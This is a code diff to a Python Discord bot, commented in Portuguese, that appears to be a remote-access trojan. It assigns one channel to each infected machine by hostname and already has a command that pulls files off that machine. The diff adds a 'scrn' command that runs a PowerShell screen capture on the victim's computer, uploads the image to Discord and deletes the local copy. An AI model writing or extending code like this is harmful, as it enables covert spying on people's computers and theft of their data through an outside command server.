@@ -8,14 +8,13 @@ import random
 import time
 import urllib.request
 import json
-import locale 
 
 # ======================== CONFIGURAÇÃO ========================
 
 TOKEN = "TOKEN"
 GUILD_ID = 1343592669338665038  # ID do servidor
 CHANNEL_NAME = "🌐｜dashboard"
-ENCODING = locale.getpreferredencoding()
+ENCODING = "cp850" 
 
 intents = discord.Intents.default()
 intents.messages = True
@@ -199,6 +198,36 @@ async def download(interaction: discord.Interaction, caminho: str):
                 await interaction.followup.send(f"❌ Erro ao tentar enviar o ficheiro: {e}", ephemeral=True)
         else:
             await interaction.followup.send("❌ Ficheiro não encontrado.", ephemeral=True)
+    else:
+        await interaction.response.send_message("⚠ Este comando só pode ser usado no canal da máquina correspondente!", ephemeral=True)
+
+
+@bot.tree.command(name="scrn", description="Captura uma screenshot")
+async def screenshot(interaction: discord.Interaction):
+    if interaction.channel.name.lower() == platform.node().lower():
+        await interaction.response.defer(thinking=True)
+        normal_activity()
+        try:
+            file_path = "image.png"
+            cmd = (
+                'cmd /c powershell -Command "'
+                'Add-Type -AssemblyName System.Windows.Forms; '
+                'Add-Type -AssemblyName System.Drawing; '
+                '$bmp = New-Object System.Drawing.Bitmap([System.Windows.Forms.SystemInformation]::VirtualScreen.Width, '
+                '[System.Windows.Forms.SystemInformation]::VirtualScreen.Height); '
+                '$graphics = [System.Drawing.Graphics]::FromImage($bmp); '
+                '$graphics.CopyFromScreen(0, 0, 0, 0, $bmp.Size); '
+                '$bmp.Save(\'image.png\')"'
+            )
+            subprocess.run(cmd, shell=True)
+
+            if os.path.exists(file_path):
+                await interaction.followup.send(file=discord.File(file_path))
+                os.remove(file_path)
+            else:
+                await interaction.followup.send("❌ Erro ao capturar screenshot: Arquivo não encontrado.")
+        except Exception as e:
+            await interaction.followup.send(f"❌ Erro ao capturar screenshot: {e}")
     else:
         await interaction.response.send_message("⚠ Este comando só pode ser usado no canal da máquina correspondente!", ephemeral=True)
 
